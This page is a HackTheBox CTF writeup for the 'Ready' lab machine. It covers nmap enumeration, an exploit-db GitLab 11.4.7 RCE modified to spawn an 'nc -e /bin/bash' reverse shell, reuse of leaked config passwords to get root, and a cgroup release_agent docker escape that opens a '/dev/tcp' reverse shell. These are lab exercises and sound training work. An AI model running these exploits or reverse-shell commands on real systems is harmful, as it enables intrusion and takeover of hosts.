<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Ready | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,medium"><meta name=description content="Ready HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/ready/><link crossorigin=anonymous href=/assets/css/stylesheet.35b906a90813b2766df33de5f84bf4610918496b745304c45e387646ed743bea.css integrity="sha256-NbkGqQgTsnZt8z3l+Ev0YQkYSWt0UwTEXjh2Ru10O+o=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/ready/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Ready "><meta property="og:description" content="Ready HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/ready/ready.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-05-15T20:57:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/ready/ready.png"><meta name=twitter:title content="Ready "><meta name=twitter:description content="Ready HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Ready ","item":"https://s4ch.github.io/writeups/hackthebox/ready/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Ready ","name":"Ready ","description":"Ready HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","medium"],"articleBody":"Information Name: Ready Profile: www.hackthebox.eu Difficulty: Medium OS: Linux Points: 30 Overview Install tools used in this WU on BlackArch Linux:\n$ sudo pacman -S nmap exploit-db pwncat Network enumeration Port and service scan with nmap:\n# Nmap 7.91 scan initiated Fri Feb 5 18:56:03 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.10.220 Nmap scan report for 10.10.10.220 Host is up (0.030s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 5080/tcp open http nginx |_http-favicon: Unknown favicon MD5: F7E3D97F404E71D302B3239EEF48D5F2 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | http-robots.txt: 53 disallowed entries (15 shown) | / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit | http-title: Sign in \\xC2\\xB7 GitLab |_Requested resource was http://10.10.10.220:5080/users/sign_in |_http-trane-info: Problem with XML parsing of /evox/about Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Feb 5 18:56:34 2021 -- 1 IP address (1 host up) scanned in 30.44 seconds Web discovery We have a Gitlab server at http://10.10.10.220:5080\nWe can register and once authenticated at http://10.10.10.220:5080/help we can find the version is 11.4.7.\nsearchsploit gitlab 11.4.7 shows us 3 RCE.\nExploring for public projects at http://10.10.10.220:5080/explore/projects we can see dude/ready-channel.\nWeb exploitation All the exploits are dirty and broken so I picked the first and had to modify it:\n$ searchsploit -p 49334.py Exploit: GitLab 11.4.7 - RCE (Authenticated) URL: https://www.exploit-db.com/exploits/49334 Path: /usr/share/exploitdb/exploits/ruby/webapps/49334.py File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators $ cp /usr/share/exploitdb/exploits/ruby/webapps/49334.py . diff /usr/share/exploitdb/exploits/ruby/webapps/49334.py 49334.py\n22c22 \u003c parser.add_argument('-P', help='reverse shell port', required=True) --- \u003e parser.add_argument('-x', help='reverse shell port', required=True) 29c29 \u003c local_port = args.p --- \u003e local_port = args.x 59c59 \u003c lpush resque:gitlab:queue:system_hook_push \"{\\\\\"class\\\\\":\\\\\"GitlabShellWorker\\\\\",\\\\\"args\\\\\":[\\\\\"class_eval\\\\\",\\\\\"open(\\\\'|\"\"\" + f'nc {local_ip} {local_port}' + \"\"\" \\\\').read\\\\\"],\\\\\"retry\\\\\":3,\\\\\"queue\\\\\":\\\\\"system_hook_push\\\\\",\\\\\"jid\\\\\":\\\\\"ad52abc5641173e217eb2e52\\\\\",\\\\\"created_at\\\\\":1608799993.1234567,\\\\\"enqueued_at\\\\\":1608799993.1234567}\" --- \u003e lpush resque:gitlab:queue:system_hook_push \"{\\\\\"class\\\\\":\\\\\"GitlabShellWorker\\\\\",\\\\\"args\\\\\":[\\\\\"class_eval\\\\\",\\\\\"open(\\\\'|\"\"\" + f'nc {local_ip} {local_port}' + ' -e /bin/bash' + \"\"\" \\\\').read\\\\\"],\\\\\"retry\\\\\":3,\\\\\"queue\\\\\":\\\\\"system_hook_push\\\\\",\\\\\"jid\\\\\":\\\\\"ad52abc5641173e217eb2e52\\\\\",\\\\\"created_at\\\\\":1608799993.1234567,\\\\\"enqueued_at\\\\\":1608799993.1234567}\" Then we can launch the exploit.\n$ python 49334.py -u cyfun -p password -g http://10.10.10.220 -l 10.10.14.172 -x 9999 We receive the reverse shell on our listener:\n$ pwncat -l 9999 -vv INFO: Listening on :::9999 (family 10/IPv6, TCP) INFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP) INFO: Client connected from 10.10.10.220:59942 (family 2/IPv4, TCP) id uid=998(git) gid=998(git) groups=998(git) Let’s find the flag:\n$ find /home -name user.txt -type f /home/dude/user.txt Privilege Escalation of Machine : from git to root We are in a docker container:\ngit@gitlab:~$ ls -lh /.dockerenv -rwxr-xr-x 1 root root 0 Dec 1 12:41 /.dockerenv There is the password of root (container).\ngit@gitlab:~$ cat /root_pass YG65407Bjqvv9A0a8Tm_7w In /var/backup there is a docker-compose.yml explaining the origin of root_pass.\nversion: '2.4' services: web: image: 'gitlab/gitlab-ce:11.4.7-ce.0' restart: always hostname: 'gitlab.example.com' environment: GITLAB_OMNIBUS_CONFIG: | external_url 'http://172.19.0.2' redis['bind']='127.0.0.1' redis['port']=6379 gitlab_rails['initial_root_password']=File.read('/root_pass') networks: gitlab: ipv4_address: 172.19.0.2 ports: - '5080:80' #- '127.0.0.1:5080:80' #- '127.0.0.1:50443:443' #- '127.0.0.1:5022:22' volumes: - './srv/gitlab/config:/etc/gitlab' - './srv/gitlab/logs:/var/log/gitlab' - './srv/gitlab/data:/var/opt/gitlab' - './root_pass:/root_pass' privileged: true restart: unless-stopped #mem_limit: 1024m networks: gitlab: driver: bridge ipam: config: - subnet: 172.19.0.0/16 There is a password in gitlab config:\ngit@gitlab:/opt/backup$ grep -v '^#' gitlab.rb | tr -d '\\n' \u0026\u0026 echo gitlab_rails['smtp_password'] = \"wW59U!ZKMbG9+*#h\" Then we can try password reuse on the root account.\ngit@gitlab:/opt/backup$ su root Password: root@gitlab:/opt/backup# cd root@gitlab:~# id uid=0(root) gid=0(root) groups=0(root) Now we have to escape from the container.\nI used the second PoC from HackTricks - Docker breakout\nmkdir /tmp/cgrp \u0026\u0026 mount -t cgroup -o rdma cgroup /tmp/cgrp \u0026\u0026 mkdir /tmp/cgrp/x echo 1 \u003e /tmp/cgrp/x/notify_on_release host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab` echo \"$host_path/cmd\" \u003e /tmp/cgrp/release_agent echo '#!/bin/bash' \u003e /cmd echo \"bash -i \u003e\u0026 /dev/tcp/10.10.14.172/8888 0\u003e\u00261\" \u003e\u003e /cmd chmod a+x /cmd sh -c \"echo \\$\\$ \u003e /tmp/cgrp/x/cgroup.procs\" And received the reverse shell:\n$ pwncat -l 8888 -vv INFO: Listening on :::8888 (family 10/IPv6, TCP) INFO: Listening on 0.0.0.0:8888 (family 2/IPv4, TCP) INFO: Client connected from 10.10.10.220:34958 (family 2/IPv4, TCP) bash: cannot set terminal process group (-1): Inappropriate ioctl for device bash: no job control in this shell root@ready:/# id uid=0(root) gid=0(root) groups=0(root) root@ready:/# cat /root/root.txt b7f98681505cd39066f67147b103c2b3 ","wordCount":"687","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/ready/ready.png","datePublished":"2021-05-15T20:57:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/ready/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Ready</h1><div class=post-description>Ready HackTheBox writeup</div><div class=post-meta>&lt;span title='2021-05-15 20:57:00 +0000 UTC'>May 15, 2021&lt;/span>&amp;nbsp;·&amp;nbsp;4 min&amp;nbsp;·&amp;nbsp;687 words&amp;nbsp;·&amp;nbsp;
&lt;a href="https://s4ch.github.io/tags/ctf/" class="post-tag" title="ctf">ctf&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/hackthebox/" class="post-tag" title="hackthebox">hackthebox&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/penetration-testing/" class="post-tag" title="penetration-testing">penetration-testing&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/writeup/" class="post-tag" title="writeup">writeup&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/linux/" class="post-tag" title="linux">linux&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/medium/" class="post-tag" title="medium">medium&lt;/a>
&amp;nbsp;·&amp;nbsp;
&lt;a href="https://s4ch.github.io/categories/writeups/" class="post-tag" title="writeups">writeups&lt;/a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/ready/ready.png alt="Ready HackTheBox Machine"><p>Ready - Medium Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#web-discovery>Web discovery</a></li><li><a href=#web-exploitation>Web exploitation</a></li><li><a href=#privilege-escalation-of-machine--from-git-to-root>Privilege Escalation of Machine : from git to root</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Ready</li><li><strong>Profile:</strong> <a href=https://app.hackthebox.eu/machines/304>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Medium</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 30</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><pre tabindex=0><code>$ sudo pacman -S nmap exploit-db pwncat
</code></pre><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p>Port and service scan with nmap:</p><pre tabindex=0><code># Nmap 7.91 scan initiated Fri Feb  5 18:56:03 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.10.220
Nmap scan report for 10.10.10.220
Host is up (0.030s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open  http    nginx
|_http-favicon: Unknown favicon MD5: F7E3D97F404E71D302B3239EEF48D5F2
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile
| /dashboard /projects/new /groups/new /groups/*/edit /users /help
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb  5 18:56:34 2021 -- 1 IP address (1 host up) scanned in 30.44 seconds
</code></pre><h2 id=web-discovery>Web discovery<a hidden class=anchor aria-hidden=true href=#web-discovery>#</a></h2><p>We have a Gitlab server at http://10.10.10.220:5080</p><p>We can register and once authenticated at http://10.10.10.220:5080/help
we can find the version is 11.4.7.</p><p><code>searchsploit gitlab 11.4.7</code> shows us 3 RCE.</p><p>Exploring for public projects at http://10.10.10.220:5080/explore/projects
we can see <code>dude/ready-channel</code>.</p><h2 id=web-exploitation>Web exploitation<a hidden class=anchor aria-hidden=true href=#web-exploitation>#</a></h2><p>All the exploits are dirty and broken so I picked the first and had to modify it:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>$ searchsploit -p 49334.py
</span></span><span style=display:flex><span>  Exploit: GitLab 11.4.7 - RCE (Authenticated)
</span></span><span style=display:flex><span>      URL: https://www.exploit-db.com/exploits/49334
</span></span><span style=display:flex><span>     Path: /usr/share/exploitdb/exploits/ruby/webapps/49334.py
</span></span><span style=display:flex><span>File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ cp /usr/share/exploitdb/exploits/ruby/webapps/49334.py .
</span></span></code></pre></div><p><code>diff /usr/share/exploitdb/exploits/ruby/webapps/49334.py 49334.py</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff><span style=display:flex><span><span style=color:#75715e>22c22
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>&lt; parser.add_argument(&#39;-P&#39;, help=&#39;reverse shell port&#39;, required=True)
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=font-weight:700>---
</span></span></span><span style=display:flex><span><span style=font-weight:700></span><span style=color:#a6e22e>&gt; parser.add_argument(&#39;-x&#39;, help=&#39;reverse shell port&#39;, required=True)
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>29c29
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>&lt; local_port = args.p
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=font-weight:700>---
</span></span></span><span style=display:flex><span><span style=font-weight:700></span><span style=color:#a6e22e>&gt; local_port = args.x
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>59c59
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>&lt;     lpush resque:gitlab:queue:system_hook_push &#34;{\\&#34;class\\&#34;:\\&#34;GitlabShellWorker\\&#34;,\\&#34;args\\&#34;:[\\&#34;class_eval\\&#34;,\\&#34;open(\\&#39;|&#34;&#34;&#34; + f&#39;nc {local_ip} {local_port}&#39; + &#34;&#34;&#34; \\&#39;).read\\&#34;],\\&#34;retry\\&#34;:3,\\&#34;queue\\&#34;:\\&#34;system_hook_push\\&#34;,\\&#34;jid\\&#34;:\\&#34;ad52abc5641173e217eb2e52\\&#34;,\\&#34;created_at\\&#34;:1608799993.1234567,\\&#34;enqueued_at\\&#34;:1608799993.1234567}&#34;
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=font-weight:700>---
</span></span></span><span style=display:flex><span><span style=font-weight:700></span><span style=color:#a6e22e>&gt;     lpush resque:gitlab:queue:system_hook_push &#34;{\\&#34;class\\&#34;:\\&#34;GitlabShellWorker\\&#34;,\\&#34;args\\&#34;:[\\&#34;class_eval\\&#34;,\\&#34;open(\\&#39;|&#34;&#34;&#34; + f&#39;nc {local_ip} {local_port}&#39; + &#39; -e /bin/bash&#39; + &#34;&#34;&#34; \\&#39;).read\\&#34;],\\&#34;retry\\&#34;:3,\\&#34;queue\\&#34;:\\&#34;system_hook_push\\&#34;,\\&#34;jid\\&#34;:\\&#34;ad52abc5641173e217eb2e52\\&#34;,\\&#34;created_at\\&#34;:1608799993.1234567,\\&#34;enqueued_at\\&#34;:1608799993.1234567}&#34;
</span></span></span></code></pre></div><p>Then we can launch the exploit.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>$ python 49334.py -u cyfun -p password -g http://10.10.10.220 -l 10.10.14.172 -x 9999
</span></span></code></pre></div><p>We receive the reverse shell on our listener:</p><pre tabindex=0><code>$ pwncat -l 9999 -vv
INFO: Listening on :::9999 (family 10/IPv6, TCP)
INFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)
INFO: Client connected from 10.10.10.220:59942 (family 2/IPv4, TCP)
id
uid=998(git) gid=998(git) groups=998(git)
</code></pre><p>Let&rsquo;s find the flag:</p><pre tabindex=0><code>$ find /home -name user.txt -type f
/home/dude/user.txt
</code></pre><h2 id=privilege-escalation-of-machine--from-git-to-root>Privilege Escalation of Machine : from git to root<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-git-to-root>#</a></h2><p>We are in a docker container:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>git@gitlab:~$ ls -lh /.dockerenv
</span></span><span style=display:flex><span>-rwxr-xr-x 1 root root 0 Dec  1 12:41 /.dockerenv
</span></span></code></pre></div><p>There is the password of root (container).</p><pre tabindex=0><code>git@gitlab:~$ cat /root_pass
YG65407Bjqvv9A0a8Tm_7w
</code></pre><p>In <code>/var/backup</code> there is a <code>docker-compose.yml</code> explaining the origin of
<code>root_pass</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yml data-lang=yml><span style=display:flex><span><span style=color:#f92672>version</span>: <span style=color:#e6db74>&#39;2.4&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>services</span>:
</span></span><span style=display:flex><span>  <span style=color:#f92672>web</span>:
</span></span><span style=display:flex><span>    <span style=color:#f92672>image</span>: <span style=color:#e6db74>&#39;gitlab/gitlab-ce:11.4.7-ce.0&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>restart</span>: <span style=color:#ae81ff>always</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>hostname</span>: <span style=color:#e6db74>&#39;gitlab.example.com&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>environment</span>:
</span></span><span style=display:flex><span>      <span style=color:#f92672>GITLAB_OMNIBUS_CONFIG</span>: |<span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        external_url &#39;http://172.19.0.2&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        redis[&#39;bind&#39;]=&#39;127.0.0.1&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        redis[&#39;port&#39;]=6379
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        gitlab_rails[&#39;initial_root_password&#39;]=File.read(&#39;/root_pass&#39;)</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>networks</span>:
</span></span><span style=display:flex><span>      <span style=color:#f92672>gitlab</span>:
</span></span><span style=display:flex><span>        <span style=color:#f92672>ipv4_address</span>: <span style=color:#ae81ff>172.19.0.2</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>ports</span>:
</span></span><span style=display:flex><span>      - <span style=color:#e6db74>&#39;5080:80&#39;</span>
</span></span><span style=display:flex><span>      <span style=color:#75715e>#- &#39;127.0.0.1:5080:80&#39;</span>
</span></span><span style=display:flex><span>      <span style=color:#75715e>#- &#39;127.0.0.1:50443:443&#39;</span>
</span></span><span style=display:flex><span>      <span style=color:#75715e>#- &#39;127.0.0.1:5022:22&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>volumes</span>:
</span></span><span style=display:flex><span>      - <span style=color:#e6db74>&#39;./srv/gitlab/config:/etc/gitlab&#39;</span>
</span></span><span style=display:flex><span>      - <span style=color:#e6db74>&#39;./srv/gitlab/logs:/var/log/gitlab&#39;</span>
</span></span><span style=display:flex><span>      - <span style=color:#e6db74>&#39;./srv/gitlab/data:/var/opt/gitlab&#39;</span>
</span></span><span style=display:flex><span>      - <span style=color:#e6db74>&#39;./root_pass:/root_pass&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>privileged</span>: <span style=color:#66d9ef>true</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>restart</span>: <span style=color:#ae81ff>unless-stopped</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#mem_limit: 1024m</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>networks</span>:
</span></span><span style=display:flex><span>  <span style=color:#f92672>gitlab</span>:
</span></span><span style=display:flex><span>    <span style=color:#f92672>driver</span>: <span style=color:#ae81ff>bridge</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>ipam</span>:
</span></span><span style=display:flex><span>      <span style=color:#f92672>config</span>:
</span></span><span style=display:flex><span>        - <span style=color:#f92672>subnet</span>: <span style=color:#ae81ff>172.19.0.0</span><span style=color:#ae81ff>/16</span>
</span></span></code></pre></div><p>There is a password in gitlab config:</p><pre tabindex=0><code>git@gitlab:/opt/backup$ grep -v &#39;^#&#39; gitlab.rb | tr -d &#39;\n&#39; &amp;&amp; echo
gitlab_rails[&#39;smtp_password&#39;] = &#34;wW59U!ZKMbG9+*#h&#34;
</code></pre><p>Then we can try password reuse on the root account.</p><pre tabindex=0><code>git@gitlab:/opt/backup$ su root
Password:
root@gitlab:/opt/backup# cd
root@gitlab:~# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre><p>Now we have to escape from the container.</p><p>I used the second PoC from <a href=https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#i-own-root>HackTricks - Docker breakout</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>mkdir /tmp/cgrp <span style=color:#f92672>&amp;&amp;</span> mount -t cgroup -o rdma cgroup /tmp/cgrp <span style=color:#f92672>&amp;&amp;</span> mkdir /tmp/cgrp/x
</span></span><span style=display:flex><span>echo <span style=color:#ae81ff>1</span> &gt; /tmp/cgrp/x/notify_on_release
</span></span><span style=display:flex><span>host_path<span style=color:#f92672>=</span><span style=color:#e6db74>`</span>sed -n <span style=color:#e6db74>&#39;s/.*\perdir=\([^,]*\).*/\1/p&#39;</span> /etc/mtab<span style=color:#e6db74>`</span>
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;</span>$host_path<span style=color:#e6db74>/cmd&#34;</span> &gt; /tmp/cgrp/release_agent
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#39;#!/bin/bash&#39;</span> &gt; /cmd
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.172/8888 0&gt;&amp;1&#34;</span> &gt;&gt; /cmd
</span></span><span style=display:flex><span>chmod a+x /cmd
</span></span><span style=display:flex><span>sh -c <span style=color:#e6db74>&#34;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&#34;</span>
</span></span></code></pre></div><p>And received the reverse shell:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>$ pwncat -l 8888 -vv
</span></span><span style=display:flex><span>INFO: Listening on :::8888 (family 10/IPv6, TCP)
</span></span><span style=display:flex><span>INFO: Listening on 0.0.0.0:8888 (family 2/IPv4, TCP)
</span></span><span style=display:flex><span>INFO: Client connected from 10.10.10.220:34958 (family 2/IPv4, TCP)
</span></span><span style=display:flex><span>bash: cannot set terminal process group (-1): Inappropriate ioctl for device
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>root@ready:/# id
</span></span><span style=display:flex><span>uid=0(root) gid=0(root) groups=0(root)
</span></span><span style=display:flex><span>root@ready:/# cat /root/root.txt
</span></span><span style=display:flex><span>b7f98681505cd39066f67147b103c2b3
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/medium/>Medium</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
